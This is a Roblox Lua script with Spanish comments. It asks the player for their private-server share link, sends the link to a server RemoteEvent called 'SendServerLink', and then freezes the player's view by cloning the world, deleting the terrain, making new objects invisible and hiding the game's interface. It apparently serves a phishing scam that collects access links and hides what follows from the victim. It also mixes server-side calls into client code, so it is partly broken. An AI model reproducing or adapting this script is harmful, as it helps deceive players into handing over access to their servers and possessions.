local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

-- ====== UI ======
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local Label = Instance.new("TextLabel")
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1

local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code="

local MessageLabel = Instance.new("TextLabel")
MessageLabel.Parent = Frame
MessageLabel.Size = UDim2.new(1, -20, 0, 30)
MessageLabel.Position = UDim2.new(0, 10, 0, 110)
MessageLabel.BackgroundTransparency = 1
MessageLabel.Text = ""
MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

local Button = Instance.new("TextButton")
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Button.TextColor3 = Color3.fromRGB(255, 255, 255)

-- ====== Validación del link ======
local function isLinkValid(link)
    local startPart = "https://www.roblox.com/share?code="
    local endPart = "&type=Server"
    return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
end

-- ====== Congelar el entorno ======
local function freezeEnvironment()
    -- 1) Congelar el entorno
    local frozenFolder = Instance.new("Folder")
    frozenFolder.Name = "FrozenCopies"
    frozenFolder.Parent = Workspace

    -- Clonar todos los objetos en el Workspace
    for _, obj in pairs(Workspace:GetChildren()) do
        if obj:IsA("BasePart") or obj:IsA("Model") then
            local clone = obj:Clone()
            clone.Parent = frozenFolder
        end
    end

    -- Manejar Terrain de manera especial
    if Workspace:FindFirstChild("Terrain") then
        local newTerrain = Instance.new("Terrain")
        newTerrain.WaterWaveSize = Workspace.Terrain.WaterWaveSize
        newTerrain.WaterWaveSpeed = Workspace.Terrain.WaterWaveSpeed
        newTerrain.WaterTransparency = Workspace.Terrain.WaterTransparency
        newTerrain.WaterColor = Workspace.Terrain.WaterColor
        newTerrain.Name = "FrozenTerrain"
        newTerrain.Parent = frozenFolder
        Workspace.Terrain:Destroy()
    end

    -- 2) Asegurar que el entorno congelado tape todo
    local function onChildAdded(child)
        if child:IsA("BasePart") or child:IsA("Model") then
            child.Transparency = 1 -- Hacer transparente el nuevo objeto para que quede tapado
        end
    end

    Workspace.ChildAdded:Connect(onChildAdded)
end

-- ====== Botón principal ======
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isLinkValid(link) then
        MessageLabel.Text = "El link es válido ✅"
        MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
        local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
        if remoteEvent then
            remoteEvent:FireServer(link)
        end
        freezeEnvironment()

        -- Ocultar la interfaz del juego original para el jugador local
        local playerGui = Player:WaitForChild("PlayerGui")
        for _, child in pairs(playerGui:GetChildren()) do
            if child:IsA("ScreenGui") and child.Name ~= "RobloxGui" then
                child.Enabled = false
            end
        end

        -- Eliminar completamente la UI del link
        ScreenGui:Destroy()
    else
        MessageLabel.Text = "El link es inválido ❌"
        MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

-- Script en el servidor para manejar la detención de eventos
local function onStopAllEvents(player)
    for _, event in pairs(ReplicatedStorage:GetChildren()) do
        if event:IsA("RemoteEvent") or event:IsA("RemoteFunction") then
            event:FireAllClients()
        end
    end
end

ReplicatedStorage:WaitForChild("StopAllEvents").OnServerEvent:Connect(onStopAllEvents)
